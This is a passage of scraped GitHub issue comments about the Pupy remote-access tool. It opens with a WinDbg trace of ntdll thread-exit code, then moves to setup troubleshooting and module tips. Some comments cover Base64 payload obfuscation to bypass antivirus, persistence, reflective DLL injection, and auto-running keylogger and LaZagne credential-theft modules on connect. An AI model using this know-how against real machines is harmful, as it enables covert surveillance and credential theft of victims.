t\nntdll!RtlFreeThreadActivationContextStack:\n00007ff85fd972c0 4053            push    rbx\n0:004> t\nntdll!RtlFreeThreadActivationContextStack+0x2:\n00007ff85fd972c2 4883ec20        sub     rsp,20h\n0:004> t\nntdll!RtlFreeThreadActivationContextStack+0x6:\n00007ff85fd972c6 65488b1c2530000000 mov   rbx,qword ptr gs:[30h] gs:0000000000000030=????????????????\n0:004> t\nntdll!RtlFreeThreadActivationContextStack+0xf:\n00007ff85fd972cf 488b8bc8020000  mov     rcx,qword ptr [rbx+2C8h] ds:0000000c49f142c8=0000000c49f14290\n0:004> t\nntdll!RtlFreeThreadActivationContextStack+0x16:\n00007ff85fd972d6 e875000000      call    ntdll!RtlFreeActivationContextStack (00007ff85fd97350)\n0:004> t\nntdll!RtlFreeActivationContextStack:\n00007ff85fd97350 4885c9          test    rcx,rcx\n0:004> t\nntdll!RtlFreeActivationContextStack+0x3:\n00007ff85fd97353 744d            je      ntdll!RtlFreeActivationContextStack+0x52 (00007ff85fd973a2) [br=0]\n0:004> t\nntdll!RtlFreeActivationContextStack+0x5:\n00007ff85fd97355 48895c2408      mov     qword ptr [rsp+8],rbx ss:0000000c4a77f680=0000000000000000\n0:004> t\nntdll!RtlFreeActivationContextStack+0xa:\n00007ff85fd9735a 48896c2410      mov     qword ptr [rsp+10h],rbp ss:0000000c4a77f688=0000000000000000\n0:004> t\nntdll!RtlFreeActivationContextStack+0xf:\n00007ff85fd9735f 4889742418      mov     qword ptr [rsp+18h],rsi ss:0000000c4a77f690=0000000000000000\n0:004> t\nntdll!RtlFreeActivationContextStack+0x14:\n00007ff85fd97364 57              push    rdi\n0:004> t\nntdll!RtlFreeActivationContextStack+0x15:\n00007ff85fd97365 4883ec20        sub     rsp,20h\n0:004> t\nntdll!RtlFreeActivationContextStack+0x19:\n00007ff85fd97369 488b39          mov     rdi,qword ptr [rcx] ds:0000000c49f14290=0000000000000000\n0:004> t\nntdll!RtlFreeActivationContextStack+0x1c:\n00007ff85fd9736c 488bd9          mov     rbx,rcx\n0:004> t\nntdll!RtlFreeActivationContextStack+0x1f:\n00007ff85fd9736f 4885ff          test    rdi,rdi\n0:004> t\nntdll!RtlFreeActivationContextStack+0x22:\n00007ff85fd97372 0f8587000000    jne     ntdll!RtlFreeActivationContextStack+0xaf (00007ff85fd973ff) [br=0]\n0:004> t\nntdll!RtlFreeActivationContextStack+0x28:\n00007ff85fd97378 48832300        and     qword ptr [rbx],0 ds:0000000c49f14290=0000000000000000\n0:004> t\nntdll!RtlFreeActivationContextStack+0x2c:\n00007ff85fd9737c 488d7308        lea     rsi,[rbx+8]\n0:004> t\nntdll!RtlFreeActivationContextStack+0x30:\n00007ff85fd97380 488b3e          mov     rdi,qword ptr [rsi] ds:0000000c49f14298=0000000c49f14298\n0:004> t\nntdll!RtlFreeActivationContextStack+0x33:\n00007ff85fd97383 483bfe          cmp     rdi,rsi\n0:004> t\nntdll!RtlFreeActivationContextStack+0x36:\n00007ff85fd97386 751b            jne     ntdll!RtlFreeActivationContextStack+0x53 (00007ff85fd973a3) [br=0]\n0:004> t\nntdll!RtlFreeActivationContextStack+0x38:\n00007ff85fd97388 f6431802        test    byte ptr [rbx+18h],2 ds:0000000c49f142a8=02\n0:004> t\nntdll!RtlFreeActivationContextStack+0x3c:\n00007ff85fd9738c 7458            je      ntdll!RtlFreeActivationContextStack+0x96 (00007ff85fd973e6) [br=0]\n0:004> t\nntdll!RtlFreeActivationContextStack+0x3e:\n00007ff85fd9738e 488b5c2430      mov     rbx,qword ptr [rsp+30h] ss:0000000c4a77f680=0000000c49f14000\n0:004> t\nntdll!RtlFreeActivationContextStack+0x43:\n00007ff85fd97393 488b6c2438      mov     rbp,qword ptr [rsp+38h] ss:0000000c4a77f688=0000000000000000\n0:004> t\nntdll!RtlFreeActivationContextStack+0x48:\n00007ff85fd97398 488b742440      mov     rsi,qword ptr [rsp+40h] ss:0000000c4a77f690=0000000000000000\n0:004> t\nntdll!RtlFreeActivationContextStack+0x4d:\n00007ff85fd9739d 4883c420        add     rsp,20h\n0:004> t\nntdll!RtlFreeActivationContextStack+0x51:\n00007ff85fd973a1 5f              pop     rdi\n0:004> t\nntdll!RtlFreeActivationContextStack+0x52:\n00007ff85fd973a2 c3              ret\n0:004> t\nntdll!RtlFreeThreadActivationContextStack+0x1b:\n00007ff85fd972db 4883a3c802000000 and     qword ptr [rbx+2C8h],0 ds:0000000c49f142c8=0000000c49f14290\n0:004> t\nntdll!RtlFreeThreadActivationContextStack+0x23:\n00007ff85fd972e3 488bcb          mov     rcx,rbx\n0:004> t\nntdll!RtlFreeThreadActivationContextStack+0x26:\n00007ff85fd972e6 4883c420        add     rsp,20h\n0:004> t\nntdll!RtlFreeThreadActivationContextStack+0x2a:\n00007ff85fd972ea 5b              pop     rbx\n0:004> t\nntdll!RtlFreeThreadActivationContextStack+0x2b:\n00007ff85fd972eb e900000000      jmp     ntdll!RtlpInitializeThreadActivationContextStack (00007ff85fd972f0)\n0:004> t\nntdll!RtlpInitializeThreadActivationContextStack:\n00007ff85fd972f0 33c0            xor     eax,eax\n0:004> t\nntdll!RtlpInitializeThreadActivationContextStack+0x2:\n00007ff85fd972f2 4c8bc1          mov     r8,rcx\n0:004> t\nntdll!RtlpInitializeThreadActivationContextStack+0x5:\n00007ff85fd972f5 483981c8020000  cmp     qword ptr [rcx+2C8h],rax ds:0000000c49f142c8=0000000000000000\n0:004> t\nntdll!RtlpInitializeThreadActivationContextStack+0xc:\n00007ff85fd972fc 754b            jne     ntdll!RtlpInitializeThreadActivationContextStack+0x59 (00007ff85fd97349) [br=0]\n0:004> t\nntdll!RtlpInitializeThreadActivationContextStack+0xe:\n00007ff85fd972fe 488d9190020000  lea     rdx,[rcx+290h]\n0:004> t\nntdll!RtlpInitializeThreadActivationContextStack+0x15:\n00007ff85fd97305 894218          mov     dword ptr [rdx+18h],eax ds:0000000c49f142a8=00000002\n0:004> t\nntdll!RtlpInitializeThreadActivationContextStack+0x18:\n00007ff85fd97308 488902          mov     qword ptr [rdx],rax ds:0000000c49f14290=0000000000000000\n0:004> t\nntdll!RtlpInitializeThreadActivationContextStack+0x1b:\n00007ff85fd9730b 488d4208        lea     rax,[rdx+8]\n0:004> t\nntdll!RtlpInitializeThreadActivationContextStack+0x1f:\n00007ff85fd9730f 48894008        mov     qword ptr [rax+8],rax ds:0000000c49f142a0=0000000c49f14298\n0:004> t\nntdll!RtlpInitializeThreadActivationContextStack+0x23:\n00007ff85fd97313 488900          mov     qword ptr [rax],rax ds:0000000c49f14298=0000000c49f14298\n0:004> t\nntdll!RtlpInitializeThreadActivationContextStack+0x26:\n00007ff85fd97316 b82003fe7f      mov     eax,offset SharedUserData+0x320 (000000007ffe0320)\n0:004> t\nntdll!RtlpInitializeThreadActivationContextStack+0x2b:\n00007ff85fd9731b c7421c01000000  mov     dword ptr [rdx+1Ch],1 ds:0000000c49f142ac=00000001\n0:004> t\nntdll!RtlpInitializeThreadActivationContextStack+0x32:\n00007ff85fd97322 488b00          mov     rax,qword ptr [rax] ds:000000007ffe0320=00000000018996b8\n0:004> t\nntdll!RtlpInitializeThreadActivationContextStack+0x35:\n00007ff85fd97325 8b0c250400fe7f  mov     ecx,dword ptr [SharedUserData+0x4 (000000007ffe0004)] ds:000000007ffe0004=0fa00000\n0:004> t\nntdll!RtlpInitializeThreadActivationContextStack+0x3c:\n00007ff85fd9732c 480fafc8        imul    rcx,rax\n0:004> t\nntdll!RtlpInitializeThreadActivationContextStack+0x40:\n00007ff85fd97330 48c1e918        shr     rcx,18h\n0:004> t\nntdll!RtlpInitializeThreadActivationContextStack+0x44:\n00007ff85fd97334 894a20          mov     dword ptr [rdx+20h],ecx ds:0000000c49f142b0=18059258\n0:004> t\nntdll!RtlpInitializeThreadActivationContextStack+0x47:\n00007ff85fd97337 41c780a802000002000000 mov dword ptr [r8+2A8h],2 ds:0000000c49f142a8=00000000\n0:004> t\nntdll!RtlpInitializeThreadActivationContextStack+0x52:\n00007ff85fd97342 498990c8020000  mov     qword ptr [r8+2C8h],rdx ds:0000000c49f142c8=0000000000000000\n0:004> t\nntdll!RtlpInitializeThreadActivationContextStack+0x59:\n00007ff85fd97349 c3              ret\n0:004> t\nntdll!LdrShutdownThread+0x22c:\n00007ff85fd41fdc 4c8d9c24d0000000 lea     r11,[rsp+0D0h]\n0:004> t\nntdll!LdrShutdownThread+0x234:\n00007ff85fd41fe4 498b5b38        mov     rbx,qword ptr [r11+38h] ds:0000000c4a77f7b8=0000000000000000\n0:004> t\nntdll!LdrShutdownThread+0x238:\n00007ff85fd41fe8 498b7340        mov     rsi,qword ptr [r11+40h] ds:0000000c4a77f7c0=0000000000000000\n0:004> t\nntdll!LdrShutdownThread+0x23c:\n00007ff85fd41fec 498be3          mov     rsp,r11\n0:004> t\nntdll!LdrShutdownThread+0x23f:\n00007ff85fd41fef 415f            pop     r15\n0:004> t\nntdll!LdrShutdownThread+0x241:\n00007ff85fd41ff1 415e            pop     r14\n0:004> t\nntdll!LdrShutdownThread+0x243:\n00007ff85fd41ff3 415d            pop     r13\n0:004> t\nntdll!LdrShutdownThread+0x245:\n00007ff85fd41ff5 415c            pop     r12\n0:004> t\nntdll!LdrShutdownThread+0x247:\n00007ff85fd41ff7 5f              pop     rdi\n0:004> t\nntdll!LdrShutdownThread+0x248:\n00007ff85fd41ff8 c3              ret\n0:004> t\nntdll!RtlExitUserThread+0x3e:\n00007ff85fd5da2e 33c9            xor     ecx,ecx\n0:004> t\nntdll!RtlExitUserThread+0x40:\n00007ff85fd5da30 e81b000000      call    ntdll!TpCheckTerminateWorker (00007ff85fd5da50)\n0:004> t\nntdll!TpCheckTerminateWorker:\n00007ff85fd5da50 4053            push    rbx\n0:004> t\nntdll!TpCheckTerminateWorker+0x2:\n00007ff85fd5da52 4881ecd0000000  sub     rsp,0D0h\n0:004> t\nntdll!TpCheckTerminateWorker+0x9:\n00007ff85fd5da59 488b05600a1300  mov     rax,qword ptr [ntdll!_security_cookie (00007ff85fe8e4c0)] ds:00007ff85fe8e4c0=00000ec1621761e7\n0:004> t\nntdll!TpCheckTerminateWorker+0x10:\n00007ff85fd5da60 4833c4          xor     rax,rsp\n0:004> t\nntdll!TpCheckTerminateWorker+0x13:\n00007ff85fd5da63 48898424c0000000 mov     qword ptr [rsp+0C0h],rax ss:0000000c4a77f790=0000000000000000\n0:004> t\nntdll!TpCheckTerminateWorker+0x1b:\n00007ff85fd5da6b 488bd9          mov     rbx,rcx\n0:004> t\nntdll!TpCheckTerminateWorker+0x1e:\n00007ff85fd5da6e e821000000      call    ntdll!TppIsWorkerThread (00007ff85fd5da94)\n0:004> t\nntdll!TppIsWorkerThread:\n00007ff85fd5da94 48895c2418      mov     qword ptr [rsp+18h],rbx ss:0000000c4a77f6e0=0000000000000000\n0:004> t\nntdll!TppIsWorkerThread+0x5:\n00007ff85fd5da99 55              push    rbp\n0:004> t\nntdll!TppIsWorkerThread+0x6:\n00007ff85fd5da9a 488bec          mov     rbp,rsp\n0:004> t\nntdll!TppIsWorkerThread+0x9:\n00007ff85fd5da9d 4881ec80000000  sub     rsp,80h\n0:004> t\nntdll!TppIsWorkerThread+0x10:\n00007ff85fd5daa4 4883651800      and     qword ptr [rbp+18h],0 ss:0000000c4a77f6d8=0000000000000000\n0:004> t\nntdll!TppIsWorkerThread+0x15:\n00007ff85fd5daa9 4883651000      and     qword ptr [rbp+10h],0 ss:0000000c4a77f6d0=0000000000000000\n0:004> t\nntdll!TppIsWorkerThread+0x1a:\n00007ff85fd5daae 65488b1c2530000000 mov   rbx,qword ptr gs:[30h] gs:0000000000000030=????????????????\n0:004> t\nntdll!TppIsWorkerThread+0x23:\n00007ff85fd5dab7 4885c9          test    rcx,rcx\n0:004> t\nntdll!TppIsWorkerThread+0x26:\n00007ff85fd5daba 751d            jne     ntdll!TppIsWorkerThread+0x45 (00007ff85fd5dad9) [br=0]\n0:004> t\nntdll!TppIsWorkerThread+0x28:\n00007ff85fd5dabc 48398b78170000  cmp     qword ptr [rbx+1778h],rcx ds:0000000c49f15778=0000000000000000\n0:004> t\nntdll!TppIsWorkerThread+0x2f:\n00007ff85fd5dac3 0f95c3          setne   bl\n0:004> t\nntdll!TppIsWorkerThread+0x32:\n00007ff85fd5dac6 8ac3            mov     al,bl\n0:004> t\nntdll!TppIsWorkerThread+0x34:\n00007ff85fd5dac8 488b9c24a0000000 mov     rbx,qword ptr [rsp+0A0h] ss:0000000c4a77f6e0=0000000000000000\n0:004> t\nntdll!TppIsWorkerThread+0x3c:\n00007ff85fd5dad0 4881c480000000  add     rsp,80h\n0:004> t\nntdll!TppIsWorkerThread+0x43:\n00007ff85fd5dad7 5d              pop     rbp\n0:004> t\nntdll!TppIsWorkerThread+0x44:\n00007ff85fd5dad8 c3              ret\n0:004> t\nntdll!TpCheckTerminateWorker+0x23:\n00007ff85fd5da73 84c0            test    al,al\n0:004> t\nntdll!TpCheckTerminateWorker+0x25:\n00007ff85fd5da75 0f85d9e40700    jne     ntdll!TpCheckTerminateWorker+0x7e504 (00007ff85fddbf54) [br=0]\n0:004> t\nntdll!TpCheckTerminateWorker+0x2b:\n00007ff85fd5da7b 488b8c24c0000000 mov     rcx,qword ptr [rsp+0C0h] ss:0000000c4a77f790=00000ecd28609737\n0:004> t\nntdll!TpCheckTerminateWorker+0x33:\n00007ff85fd5da83 4833cc          xor     rcx,rsp\n0:004> t\nntdll!TpCheckTerminateWorker+0x36:\n00007ff85fd5da86 e805850500      call    ntdll!_security_check_cookie (00007ff85fdb5f90)\n0:004> t\nntdll!_security_check_cookie:\n00007ff85fdb5f90 483b0d29850d00  cmp     rcx,qword ptr [ntdll!_security_cookie (00007ff85fe8e4c0)] ds:00007ff85fe8e4c0=00000ec1621761e7\n0:004> t\nntdll!_security_check_cookie+0x7:\n00007ff85fdb5f97 7511            jne     ntdll!_security_check_cookie+0x1a (00007ff85fdb5faa) [br=0]\n0:004> t\nntdll!_security_check_cookie+0x9:\n00007ff85fdb5f99 48c1c110        rol     rcx,10h\n0:004> t\nntdll!_security_check_cookie+0xd:\n00007ff85fdb5f9d 66f7c1ffff      test    cx,0FFFFh\n0:004> t\nntdll!_security_check_cookie+0x12:\n00007ff85fdb5fa2 7502            jne     ntdll!_security_check_cookie+0x16 (00007ff85fdb5fa6) [br=0]\n0:004> t\nntdll!_security_check_cookie+0x14:\n00007ff85fdb5fa4 90              nop\n0:004> t\nntdll!_security_check_cookie+0x15:\n00007ff85fdb5fa5 c3              ret\n0:004> t\nntdll!TpCheckTerminateWorker+0x3b:\n00007ff85fd5da8b 4881c4d0000000  add     rsp,0D0h\n0:004> t\nntdll!TpCheckTerminateWorker+0x42:\n00007ff85fd5da92 5b              pop     rbx\n0:004> t\nntdll!TpCheckTerminateWorker+0x43:\n00007ff85fd5da93 c3              ret\n0:004> t\nntdll!RtlExitUserThread+0x45:\n00007ff85fd5da35 8bd3            mov     edx,ebx\n0:004> t\nntdll!RtlExitUserThread+0x47:\n00007ff85fd5da37 33c9            xor     ecx,ecx\n0:004> t\nntdll!RtlExitUserThread+0x49:\n00007ff85fd5da39 e8c2830600      call    ntdll!NtTerminateThread (00007ff85fdc5e00)\n0:004> t\nntdll!NtTerminateThread:\n00007ff85fdc5e00 4c8bd1          mov     r10,rcx\n0:004> t\nntdll!NtTerminateThread+0x3:\n00007ff85fdc5e03 b853000000      mov     eax,53h\n0:004> t\nntdll!NtTerminateThread+0x8:\n00007ff85fdc5e08 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (000000007ffe0308)],1 ds:000000007ffe0308=00\n0:004> t\nntdll!NtTerminateThread+0x10:\n00007ff85fdc5e10 7503            jne     ntdll!NtTerminateThread+0x15 (00007ff85fdc5e15) [br=0]\n0:004> t\nntdll!NtTerminateThread+0x12:\n00007ff85fdc5e12 0f05            syscall\n0:004> t\nWARNING: Step/trace thread exited\nntdll!NtTerminateThread+0x14:\n00007ff85fdc5e14 c3              ret\n0:004> t\n```\n. @alxchk @n1nj4sec  after the latest commit, it works flawlessly. \nThank you, guys.\nBy the way, it would be very nice if we could also execute dll from memory like msf \n\npost/windows/manage/reflective_dll_inject.\n\nI mean Pupy already has this capability, as manage/migrate inject pupy dll into a specified process. But we could not change the injected dll.\n. It is a very big module, so it takes some time. If you want to see the progress you could directly clone it into the \"external\" folder.\n```\ncd external/\ngit clone https://github.com/AlessandroZ/LaZagne\n```\n. ",
    "aborrello": "Hi, seems to be a problem with the old payloads.\nI still get the errors when old clients connect, but there appear to be no problems with the new payloads, thanks!. Check out the wiki for information on setting up and using the pupy server:\nhttps://github.com/n1nj4sec/pupy/wiki/Setting-up-the-server. ",
    "DevarshDani": "I still receive this same error can anyone tell me the fix for this issue? I am using python2.7 . ",
    "pwna5aurus": "I get this error when an errant portscanner or some other out-of-spec client connects to the socket.  The try/exception doesn't seem to handle it...looking at a fix.. It's just Base64 encoded to obfuscate and bypass AVs.  \nhttps://www.base64decode.org. Bad Gateway sounds like a problem with the web server.  What is sitting\nbetween your web server and the victim?\n. Well, this might be relevant:\nhttps://github.com/n1nj4sec/pupy/issues/573. ",
    "NaykiSec": "I made the modification on the wiki after testing.\nhope it's right :). ",
    "praveenyadav1602": "thanks, its solved\n. ",
    "wormy638": "Clarifying: I did change the architecture with the '-A' option, just forgot to put it in the OP.. ",
    "tomer70": "Hi,\nThe issue here is caused since In pupylib\\PupyTriggers.py inside on_connect method the for loop is using client.pupsrv.config.items(\"on_connect\") which seems to work with dictionary so when you write:\nrun_module = x twice, it ran over the first one.\nAnyway, to fix this problem you can change this line: if action==\"run_module\": to if action:\nAnd then you could write whatever you want before the \u2018=\u2019 just don\u2019t repeat the same key, for example use:\nrun_module = lazagne\nrun_module2 = keylogger start\ntmp_key = gather/users\nI didn\u2019t verify that it doesn\u2019t broke anything else, but it works fine for me.\n. ",
    "tugdualnicolas": "Ho so its normal my bad ^^. You need to make it persistent look at the wiki and the try \"persistence -h\" in the pupy shell. Sorry the command was :run manage/persistence -h\n`. Its already instaled.. \nSent from my OnePlus ONEPLUS A3003 using FastHub. ",
    "theCake75": "I think its about dependencies, you should install them manually . ",
    "kdelia12": "Manually?\ncan you explain the code? thanks :D\n2017-05-31 3:53 GMT+07:00 theCake75 notifications@github.com:\n\nI think its about dependencies, you should install them manually\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/n1nj4sec/pupy/issues/406#issuecomment-305005001, or mute\nthe thread\nhttps://github.com/notifications/unsubscribe-auth/AaReTne8rlv3UyGR_6kOzvUkxUX7E2Fdks5r_IHhgaJpZM4Np_YW\n.\n. Ok problem Solved. But now, how can i start pupy? Thanks xD\nPada tanggal 1 Jun 2017 09.22, \"patoborracho\" notifications@github.com\nmenulis:\ntry to install the requirements.txt one by one and u can find the error.\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/n1nj4sec/pupy/issues/406#issuecomment-305370817, or mute\nthe thread\nhttps://github.com/notifications/unsubscribe-auth/AaReTtO3GrMyPCsGwV6tXw_QjZOR2cykks5r_iBYgaJpZM4Np_YW\n.\n. Guys? Hoe to start it please\nPada tanggal 1 Jun 2017 14.50, \"harryw3266\" notifications@github.com\nmenulis:\nThank you!\nSpark by Readdle\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/n1nj4sec/pupy/issues/406#issuecomment-305416973, or mute\nthe thread\nhttps://github.com/notifications/unsubscribe-auth/AaReTlUsxFTyOHP0ArjlWlGjqRXdUgUCks5r_m0rgaJpZM4Np_YW\n.\n. \n",
    "patoborracho": "try to install the requirements.txt one by one and u can find the error.. any help here? pls. I reinstalled python 2.7 and the pupy requirements and it work :)\nNow I have some other problems with autentication with ssl, in pupysh with debug on, it shows failed autentication ( I put the same password in pupygen and pupysh, and checked multiple times xD).\nAnd when I try with RSA it shows \"polling on already closed connection\"  (# The root of evil??)\nThanks @n1nj4sec \n. You need to open the port in the router and in pupy you have to use your public IP.\n. First make a test in the host:\n-Open port 82\n-With netcat:\nnc -lvvp 82\n-Then go to http://www.yougetsignal.com/tools/open-ports/\nand put your public ip and port 82, it will show you if it is open or close.\nPS: In Vmware you have to check your networking, I guess the bridge mode is where you receive your own ip.. ",
    "hw8665": "Thank you!\nSpark by Readdle\n. ",
    "frainfreeze": "sudo pip install typing ?. ",
    "kelvin2185": "Thank you for your response.\ni ran both commands:\nsudo pip install typing \nsudo pip install m2crypto\nwhen i run \u00a0./pupygen.py \u00a0 \u00a0 i now get this error.\nroot@ubuntu:~/pupy/pupy# ./pupygen.py\nTraceback (most recent call last):\u00a0 File \"./pupygen.py\", line 7, in \u00a0 \u00a0 from pupylib.utils.network import get_listener_ip, get_listener_port\u00a0 File \"/root/pupy/pupy/pupylib/init.py\", line 5, in \u00a0 \u00a0 from PupyCmd import *\u00a0 File \"/root/pupy/pupy/pupylib/PupyCmd.py\", line 50, in \u00a0 \u00a0 import pupygen\u00a0 File \"/root/pupy/pupy/pupygen.py\", line 10, in \u00a0 \u00a0 from pupylib.payloads.py_oneliner import serve_payload, pack_py_payload, getLinuxImportedModules\u00a0 File \"/root/pupy/pupy/pupylib/payloads/py_oneliner.py\", line 8, in \u00a0 \u00a0 import rpyc, rsa, pyasn1, yaml, netaddrImportError: No module named pyasn1\ni am using a VPS (ubuntu 14.04)\nOn Thursday, June 1, 2017 2:50 PM, Tomislav Ku\u0107ar <notifications@github.com> wrote:\n\nsudo pip install typing ?\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub, or mute the thread.  \n. i read the debug message after i installed previous module, here is new error i get from pupy\nroot@ubuntu:~/pupy/pupy# ./pupygen.py\nTraceback (most recent call last):\u00a0 File \"./pupygen.py\", line 7, in \u00a0 \u00a0 from pupylib.utils.network import get_listener_ip, get_listener_port\u00a0 File \"/root/pupy/pupy/pupylib/init.py\", line 6, in \u00a0 \u00a0 from PupyServer import \u00a0 File \"/root/pupy/pupy/pupylib/PupyServer.py\", line 30, in \u00a0 \u00a0 from pupylib.PupyDnsCnc import PupyDnsCnc\u00a0 File \"/root/pupy/pupy/pupylib/PupyDnsCnc.py\", line 4, in \u00a0 \u00a0 from network.lib.picocmd.server import \u00a0 File \"/root/pupy/pupy/network/lib/picocmd/server.py\", line 17, in \u00a0 \u00a0 import socketserverImportError: No module named socketserver\ni have tried to install socketserver module but i get this error\nroot@ubuntu:~/pupy/pupy# sudo pip install SocketServer\nDownloading/unpacking SocketServer\u00a0 Could not find any downloads that satisfy the requirement SocketServerCleaning up...No distributions at all found for SocketServerStoring debug log for failure in /root/.pip/pip.log\ni am using \u00a0Python 2.7.6\nwhy am i getting so many errors and what are the dependanciesfor pupy?\nOn Thursday, June 1, 2017 6:28 PM, Themercee <notifications@github.com> wrote:\n\nYou need to be able to read debug message. In you first post, the error was ending with: ImportError: No module named typing. What did you do? You try to install the module \"sudo pip install typing\". Now what's next? Read your debug message :)\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHub, or mute the thread.  \n. Here \u00a0are OS details:\nDistributor ID: UbuntuDescription: \u00a0 \u00a0Ubuntu 14.04.5 LTSRelease: \u00a0 \u00a0 \u00a0 \u00a014.04Codename: \u00a0 \u00a0 \u00a0 trusty\ni just did a fresh install and here are my output\u00a0\nroot@ubuntu:~# git clone https://github.com/n1nj4sec/pupy.git pupy\u00a0Cloning into 'pupy'...remote: Counting objects: 10509, done.remote: Total 10509 (delta 0), reused 0 (delta 0), pack-reused 10509Receiving objects: 100% (10509/10509), 25.49 MiB | 12.21 MiB/s, done.Resolving deltas: 100% (7151/7151), done.Checking connectivity... done.\nroot@ubuntu:~# cd pupyroot@ubuntu:~/pupy#\nroot@ubuntu:~/pupy# git submodule initSubmodule 'client/sources-linux/linux-inject' (https://github.com/gaffe23/linux-inject.git) registered for path 'client/sources-linux/linux-inject'Submodule 'pupy/external/LaZagne' (https://github.com/AlessandroZ/LaZagne) registered for path 'pupy/external/LaZagne'Submodule 'pupy/external/Windows-Exploit-Suggester' (https://github.com/GDSSecurity/Windows-Exploit-Suggester) registered for path 'pupy/external/Windows-Exploit-Suggester'Submodule 'pupy/external/changeme' (https://github.com/AlessandroZ/changeme) registered for path 'pupy/external/changeme'Submodule 'pupy/external/linux-exploit-suggester' (https://github.com/mzet-/linux-exploit-suggester) registered for path 'pupy/external/linux-exploit-suggester'Submodule 'pupy/memorpy' (https://github.com/n1nj4sec/memorpy) registered for path 'pupy/external/memorpy'Submodule 'pupy/external/mimipy' (https://github.com/n1nj4sec/mimipy.git) registered for path 'pupy/external/mimipy'Submodule 'pupy/external/pywerview' (https://github.com/the-useless-one/pywerview.git) registered for path 'pupy/external/pywerview'Submodule 'pupy/external/winpty' (https://github.com/alxchk/winpty) registered for path 'pupy/external/winpty'Submodule 'pupy/payload_templates' (https://github.com/n1nj4sec/pupy-binaries) registered for path 'pupy/payload_templates'\nroot@ubuntu:~/pupy# git submodule updateCloning into 'client/sources-linux/linux-inject'...remote: Counting objects: 403, done.remote: Total 403 (delta 0), reused 0 (delta 0), pack-reused 403Receiving objects: 100% (403/403), 262.08 KiB | 0 bytes/s, done.Resolving deltas: 100% (240/240), done.Checking connectivity... done.Submodule path 'client/sources-linux/linux-inject': checked out 'ce6d7e4b1d6c06b2fb36548e23d62685a1f91209'Cloning into 'pupy/external/LaZagne'...remote: Counting objects: 2113, done.remote: Compressing objects: 100% (111/111), done.remote: Total 2113 (delta 80), reused 125 (delta 53), pack-reused 1949Receiving objects: 100% (2113/2113), 245.45 MiB | 21.59 MiB/s, done.Resolving deltas: 100% (1071/1071), done.Checking connectivity... done.Submodule path 'pupy/external/LaZagne': checked out '89c6b013c64f1ba67b9772930e7d5d7c8177f76a'Cloning into 'pupy/external/Windows-Exploit-Suggester'...remote: Counting objects: 120, done.remote: Total 120 (delta 0), reused 0 (delta 0), pack-reused 120Receiving objects: 100% (120/120), 169.27 KiB | 0 bytes/s, done.Resolving deltas: 100% (72/72), done.Checking connectivity... done.Submodule path 'pupy/external/Windows-Exploit-Suggester': checked out '776bd91259c081588f99b5b0b9aa54e8c5fdf5ad'Cloning into 'pupy/external/changeme'...remote: Counting objects: 477, done.remote: Total 477 (delta 0), reused 0 (delta 0), pack-reused 477Receiving objects: 100% (477/477), 125.29 KiB | 0 bytes/s, done.Resolving deltas: 100% (270/270), done.Checking connectivity... done.Submodule path 'pupy/external/changeme': checked out '843684c7d109e7c0cfd6f1fe12a3e6f50fd73336'Cloning into 'pupy/external/linux-exploit-suggester'...remote: Counting objects: 103, done.remote: Total 103 (delta 0), reused 0 (delta 0), pack-reused 103Receiving objects: 100% (103/103), 157.35 KiB | 0 bytes/s, done.Resolving deltas: 100% (48/48), done.Checking connectivity... done.Submodule path 'pupy/external/linux-exploit-suggester': checked out 'dd5aedcc80c8cad05d29da5a65da378288cbf27a'Cloning into 'pupy/external/memorpy'...remote: Counting objects: 269, done.remote: Compressing objects: 100% (16/16), done.remote: Total 269 (delta 8), reused 13 (delta 5), pack-reused 248Receiving objects: 100% (269/269), 79.71 KiB | 0 bytes/s, done.Resolving deltas: 100% (156/156), done.Checking connectivity... done.Submodule path 'pupy/external/memorpy': checked out 'ba84ef3987a38f6d554f42755cc8e17cc93b64f7'Cloning into 'pupy/external/mimipy'...remote: Counting objects: 62, done.remote: Total 62 (delta 0), reused 0 (delta 0), pack-reused 62Unpacking objects: 100% (62/62), done.Checking connectivity... done.Submodule path 'pupy/external/mimipy': checked out 'd30f791bb3472bf88364fd7dfc5304aa42bb8705'Cloning into 'pupy/external/pywerview'...remote: Counting objects: 738, done.remote: Total 738 (delta 0), reused 0 (delta 0), pack-reused 738Receiving objects: 100% (738/738), 198.53 KiB | 0 bytes/s, done.Resolving deltas: 100% (506/506), done.Checking connectivity... done.Submodule path 'pupy/external/pywerview': checked out '6eace237766efe59424207cdf3ca3b054a1dd94b'Cloning into 'pupy/external/winpty'...remote: Counting objects: 4101, done.remote: Total 4101 (delta 0), reused 0 (delta 0), pack-reused 4101Receiving objects: 100% (4101/4101), 1.16 MiB | 0 bytes/s, done.Resolving deltas: 100% (2811/2811), done.Checking connectivity... done.Submodule path 'pupy/external/winpty': checked out '0520a563431b78061e33acf79d6dfa0aaa6a061b'Cloning into 'pupy/payload_templates'...remote: Counting objects: 135, done.remote: Compressing objects: 100% (2/2), done.remote: Total 135 (delta 0), reused 2 (delta 0), pack-reused 132Receiving objects: 100% (135/135), 249.60 MiB | 21.18 MiB/s, done.Resolving deltas: 100% (64/64), done.Checking connectivity... done.Submodule path 'pupy/payload_templates': checked out 'c858fa3488ac65c4afd916365da46f5ee21521b7'\nroot@ubuntu:~/pupy# pip install -r pupy/requirements.txtRequirement already satisfied (use --upgrade to upgrade): rpyc in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 1))Requirement already satisfied (use --upgrade to upgrade): pycryptodome in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 2))Requirement already satisfied (use --upgrade to upgrade): pefile in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 3))Requirement already satisfied (use --upgrade to upgrade): pyyaml in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 4))Requirement already satisfied (use --upgrade to upgrade): rsa in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 5))Requirement already satisfied (use --upgrade to upgrade): netaddr in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 6))Requirement already satisfied (use --upgrade to upgrade): ecdsa==0.13 in /usr/local/lib/python2.7/dist-packages (from -r pupy/requirements.txt (line 7))Requirement already satisfied (use 